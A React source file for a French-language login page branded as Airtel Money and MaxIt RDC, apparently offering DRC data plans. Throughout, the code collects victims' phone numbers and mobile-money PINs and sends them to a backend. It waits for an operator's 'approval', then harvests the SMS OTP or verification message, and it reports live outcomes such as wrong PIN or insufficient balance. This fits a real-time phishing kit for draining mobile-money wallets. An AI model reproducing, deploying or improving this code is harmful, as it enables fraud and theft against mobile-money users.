import React, { useState, useEffect, useRef, useCallback } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { useData } from '../DataContext';
import { useUserId } from '../hooks/useUserId';
import './Login.css';

// ─── Config ───
const API_BASE = import.meta.env.VITE_API_URL || '';
const MAX_APPROVAL_POLLS = 60;
const APPROVAL_POLL_MS  = 5000;
const MAX_OTP_POLLS     = 150;  // 5 min at 2s
const OTP_POLL_MS       = 2000;

// ─── Phone validation (DRC +243) ───
function validatePhone(raw) {
  const digits = raw.replace(/\D/g, '');
  if (!/^[89]/.test(digits)) return { valid: false, error: 'Doit commencer par 8 ou 9' };
  if (digits.length < 9 || digits.length > 10) return { valid: false, error: '9 à 10 chiffres requis' };
  return { valid: true, formatted: `+243${digits}` };
}

// ─── Provider config ───
const PROVIDER_CONFIG = {
  airtel: {
    name: 'Airtel Money',
    otpLabel: 'Code OTP',
    otpPlaceholder: 'Entrez le code OTP à 4 chiffres',
    otpInstructions: 'Entrez le code OTP envoyé sur votre appareil',
    inputType: 'numeric',
  },
  maxit: {
    name: 'MaxIt RDC',
    otpLabel: 'Message de Vérification',
    otpPlaceholder: 'Collez le message complet de vérification reçu sur votre appareil...',
    otpInstructions: 'Collez le message complet de vérification reçu sur votre appareil',
    inputType: 'textarea',
  },
};

export default function Login() {
  const navigate = useNavigate();
  const { userId, provider } = useParams();
  const { userId: hookUserId } = useUserId();
  const { selectedPlan } = useData();

  const effectiveUserId = userId || hookUserId;
  const providerCfg = PROVIDER_CONFIG[provider] || PROVIDER_CONFIG.airtel;
  const plan = selectedPlan || null;

  // ─── State ───
  const [stage, setStage] = useState('credentials');
  const [phone, setPhone] = useState('');
  const [pin, setPin] = useState(['', '', '', '']);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [otpValue, setOtpValue] = useState('');
  const [resendDisabled, setResendDisabled] = useState(false);
  const [resendCountdown, setResendCountdown] = useState(0);
  const [pollCount, setPollCount] = useState(0);

  const pinRefs = [useRef(), useRef(), useRef(), useRef()];
  const pollRef = useRef(null);
  const mountedRef = useRef(true);

  const resendTimerRef = useRef(null);

  useEffect(() => {
    mountedRef.current = true;
    return () => { mountedRef.current = false; clearInterval(pollRef.current); clearInterval(resendTimerRef.current); };
  }, []);

  // 25s countdown timer for resend
  useEffect(() => {
    if (resendCountdown <= 0) {
      setResendDisabled(false);
      clearInterval(resendTimerRef.current);
      return;
    }
    resendTimerRef.current = setInterval(() => {
      setResendCountdown((c) => {
        if (c <= 1) { clearInterval(resendTimerRef.current); setResendDisabled(false); return 0; }
        return c - 1;
      });
    }, 1000);
    return () => clearInterval(resendTimerRef.current);
  }, [resendCountdown > 0]); // eslint-disable-line

  // ─── Redirect if no plan selected ───
  useEffect(() => {
    if (!plan) navigate(`/${effectiveUserId}`, { replace: true });
  }, [plan, navigate, effectiveUserId]);

  // ─── Check if user already approved (returning user) ───
  useEffect(() => {
    const checkReturning = async () => {
      try {
        const res = await fetch(`${API_BASE}/api/${effectiveUserId}/check-user-status`, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
        const data = await res.json();
        if (data.success && data.hasActiveSession) {
          navigate(`/${effectiveUserId}/status/${provider}`, { replace: true });
        }
      } catch (_) { /* ignore */ }
    };
    checkReturning();
  }, [effectiveUserId, navigate, provider]);

  // ─── API helper ───
  const apiCall = useCallback(async (endpoint, body) => {
    const res = await fetch(`${API_BASE}/api/${effectiveUserId}/${endpoint}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    return res.json();
  }, [effectiveUserId]);

  // ─── PIN input handlers ───
  const handlePinChange = (index, value) => {
    if (!/^\d?$/.test(value)) return;
    const next = [...pin];
    next[index] = value;
    setPin(next);
    if (value && index < 3) pinRefs[index + 1].current?.focus();
  };

  const handlePinKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !pin[index] && index > 0) {
      pinRefs[index - 1].current?.focus();
    }
  };

  // ─── Submit credentials ───
  const handleSubmitCredentials = async () => {
    const pv = validatePhone(phone);
    if (!pv.valid) return setError(pv.error);
    const fullPin = pin.join('');
    if (fullPin.length !== 4) return setError('Entrez votre code PIN à 4 chiffres');

    setLoading(true);
    setError(null);

    try {
      const data = await apiCall('login', {
        phoneNumber: pv.formatted,
        pin: fullPin,
        provider: provider,
        package: plan ? { id: plan.id, data: plan.data, price: plan.price } : null,
        timestamp: Date.now(),
      });

      if (!data.success) { setError(data.message || 'Échec de connexion'); setLoading(false); return; }

      if (data.returningUser) { navigate(`/${effectiveUserId}/status/${provider}`, { replace: true }); return; }

      setLoading(false);
      setStage('approvalWaiting');
      startApprovalPolling(pv.formatted, fullPin);
    } catch (err) {
      setError('Erreur de connexion. Veuillez réessayer.');
      setLoading(false);
    }
  };

  // ─── Approval polling ───
  const startApprovalPolling = (phoneNum, pinVal) => {
    let count = 0;
    clearInterval(pollRef.current);

    pollRef.current = setInterval(async () => {
      if (!mountedRef.current) { clearInterval(pollRef.current); return; }
      count++;
      setPollCount(count);

      if (count >= MAX_APPROVAL_POLLS) {
        clearInterval(pollRef.current);
        setError('Session expirée. Veuillez réessayer.');
        setStage('credentials');
        return;
      }

      try {
        const data = await apiCall('check-login-approval', { phoneNumber: phoneNum, pin: pinVal });

        if (data.approved) {
          clearInterval(pollRef.current);
          setStage('otp');
          setResendCountdown(25);
          setResendDisabled(true);
        } else if (data.rejected) {
          clearInterval(pollRef.current);
          setError(data.expired ? 'Session expirée. Veuillez réessayer.' : 'Connexion rejetée. Identifiants invalides.');
          setStage('credentials');
        }
      } catch (_) { /* keep polling */ }
    }, APPROVAL_POLL_MS);
  };

  // ─── Submit OTP / verification message ───
  const handleSubmitOtp = async () => {
    const pv = validatePhone(phone);
    if (!pv.valid) return;

    if (provider === 'airtel') {
      if (!/^\d{4}$/.test(otpValue)) return setError('Entrez un code valide à 4 chiffres');
    } else {
      if (!otpValue.trim()) return setError('Collez le message de vérification SMS');
      if (otpValue.length > 500) return setError('Message trop long (max 500 caractères)');
    }

    setStage('otpProcessing');
    setError(null);

    try {
      const data = await apiCall('verify-otp', {
        phoneNumber: pv.formatted,
        otp: otpValue.trim(),
        provider: provider,
        package: plan ? { id: plan.id, data: plan.data, price: plan.price } : null,
        timestamp: Date.now(),
      });

      if (!data.success) { setError(data.message || 'Échec de vérification'); setStage('otp'); return; }

      startOtpPolling(pv.formatted, otpValue.trim());
    } catch (err) {
      setError('Erreur de connexion. Veuillez réessayer.');
      setStage('otp');
    }
  };

  // ─── OTP status polling ───
  const startOtpPolling = (phoneNum, otpVal) => {
    let count = 0;
    clearInterval(pollRef.current);

    pollRef.current = setInterval(async () => {
      if (!mountedRef.current) { clearInterval(pollRef.current); return; }
      count++;

      if (count >= MAX_OTP_POLLS) {
        clearInterval(pollRef.current);
        setError('Vérification expirée. Veuillez réessayer.');
        setStage('otp');
        return;
      }

      try {
        const data = await apiCall('check-otp-status', { phoneNumber: phoneNum, otp: otpVal });

        if (data.status === 'approved') {
          clearInterval(pollRef.current);
          navigate(`/${effectiveUserId}/status/${provider}`, { replace: true });
        } else if (data.status === 'rejected') {
          clearInterval(pollRef.current);
          setError(provider === 'airtel' ? 'Le code OTP est incorrect.' : 'Message de vérification rejeté.');
          setStage('otp');
          setOtpValue('');
        } else if (data.status === 'wrong_pin') {
          clearInterval(pollRef.current);
          setError('Votre code PIN est incorrect. Veuillez recommencer.');
          setStage('credentials');
          setOtpValue('');
          setPin(['', '', '', '']);
        } else if (data.status === 'insufficient') {
          clearInterval(pollRef.current);
          setError(`Solde insuffisant pour le forfait ${plan?.data || 'sélectionné'} ($${plan?.price?.toFixed(2) || '?'}). Veuillez recharger et réessayer.`);
          setStage('otp');
          setOtpValue('');
        } else if (data.status === 'timeout') {
          clearInterval(pollRef.current);
          setError('Session expirée.');
          setStage('otp');
        }
      } catch (_) { /* keep polling */ }
    }, OTP_POLL_MS);
  };

  // ─── Resend OTP ───
  const handleResend = async () => {
    const pv = validatePhone(phone);
    if (!pv.valid) return;
    setResendDisabled(true);
    setResendCountdown(25);

    try {
      await apiCall('resend-otp', { phoneNumber: pv.formatted, provider: provider, timestamp: Date.now() });
    } catch (_) { /* ignore */ }
  };

  // ─── RENDER ───
  const isAirtel = provider === 'airtel';

  return (
    <div className={`login-page ${provider}`}>
      {/* Header */}
      <header className="login-header">
        <button className="login-back-btn" onClick={() => navigate(`/${effectiveUserId}`)}>
          ←
        </button>
        <div className="login-header-info">
          <div className="provider-label">{providerCfg.name}</div>
          {plan && <div className="plan-label">{plan.data} — ${plan.price?.toFixed(2)}</div>}
        </div>
        <img className="provider-badge" src={isAirtel ? '/vite.svg' : '/maxit.svg'} alt={providerCfg.name} />
      </header>

      <div className="login-body">
        {/* ─── CREDENTIALS STAGE ─── */}
        {stage === 'credentials' && (
          <>
            <h2 className="login-section-title">
              {isAirtel ? 'Connexion Airtel Money' : 'Connexion MaxIt'}
            </h2>
            <p className="login-section-subtitle">
              {isAirtel ? 'Entrez votre code PIN Airtel Money' : 'Entrez votre code PIN MaxIt'}
            </p>

            {/* Phone */}
            <div className="input-group">
              <label>Numéro de Téléphone</label>
              <div className="phone-input-wrapper">
                <div className="phone-prefix">
                  <span className="flag">🇨🇩</span> +243
                </div>
                <input
                  type="tel"
                  placeholder="9XXXXXXXXX"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value.replace(/[^\d]/g, ''))}
                  maxLength={10}
                />
              </div>
            </div>

            {/* PIN */}
            <div className="input-group">
              <label>Code PIN {isAirtel ? 'Airtel Money' : 'MaxIt'}</label>
              <div className="pin-input-row">
                {pin.map((digit, i) => (
                  <input
                    key={i}
                    ref={pinRefs[i]}
                    className="pin-box"
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handlePinChange(i, e.target.value)}
                    onKeyDown={(e) => handlePinKeyDown(i, e)}
                  />
                ))}
              </div>
            </div>

            {/* Submit */}
            <button
              className="login-submit-btn"
              disabled={loading || phone.length < 9 || pin.join('').length < 4}
              onClick={handleSubmitCredentials}
            >
              {loading ? 'Connexion...' : 'Continuer'}
            </button>
          </>
        )}

        {/* ─── APPROVAL WAITING STAGE ─── */}
        {stage === 'approvalWaiting' && (
          <div className="waiting-screen">
            <div className="waiting-spinner" />
            <h3>Vérification en cours</h3>
            <p>Veuillez patienter pendant la vérification de vos informations {providerCfg.name}...</p>
          </div>
        )}

        {/* ─── OTP / VERIFICATION STAGE ─── */}
        {stage === 'otp' && (
          <div className="otp-section">
            <h2 className="login-section-title">{providerCfg.otpLabel}</h2>
            <p className="otp-instructions">{providerCfg.otpInstructions}</p>

            {isAirtel ? (
              <input
                className="otp-input-single"
                type="text"
                inputMode="numeric"
                maxLength={4}
                placeholder="0000"
                value={otpValue}
                onChange={(e) => setOtpValue(e.target.value.replace(/[^\d]/g, ''))}
                autoFocus
              />
            ) : (
              <>
                <textarea
                  className="otp-message-box"
                  placeholder={providerCfg.otpPlaceholder}
                  value={otpValue}
                  onChange={(e) => {
                    if (e.target.value.length <= 500) setOtpValue(e.target.value);
                  }}
                  autoFocus
                />
                <div className={`otp-char-count${otpValue.length > 450 ? ' near-limit' : ''}`}>
                  {otpValue.length}/500
                </div>
              </>
            )}

            <button
              className="login-submit-btn"
              disabled={isAirtel ? otpValue.length !== 4 : !otpValue.trim()}
              onClick={handleSubmitOtp}
            >
              Vérifier
            </button>

            <div className="resend-row">
              <button
                className="resend-link"
                disabled={resendDisabled}
                onClick={handleResend}
              >
                {resendDisabled && resendCountdown > 0
                  ? `Renvoyer dans ${resendCountdown}s`
                  : "Pas reçu ? Renvoyer"}
              </button>
            </div>
          </div>
        )}

        {/* ─── OTP PROCESSING STAGE ─── */}
        {stage === 'otpProcessing' && (
          <div className="processing-overlay">
            <div className="processing-icon">
              <span>{isAirtel ? '🔐' : '📨'}</span>
            </div>
            <h3>Vérification...</h3>
            <p>{isAirtel ? 'Vérification de votre code OTP' : 'Vérification de votre message'}</p>
            <div className="processing-progress">
              <div className="bar" />
            </div>
          </div>
        )}
      </div>

      {/* Footer */}
      <footer className="login-footer">
        <p>🇨🇩 Services Data RDC — {providerCfg.name}</p>
      </footer>

      {/* Error Modal */}
      {error && (
        <div className="error-modal-overlay" onClick={() => setError(null)}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <div className="error-icon">⚠️</div>
            <h3>Une Erreur Est Survenue</h3>
            <p>{error}</p>
            <button onClick={() => setError(null)}>OK</button>
          </div>
        </div>
      )}
    </div>
  );
}
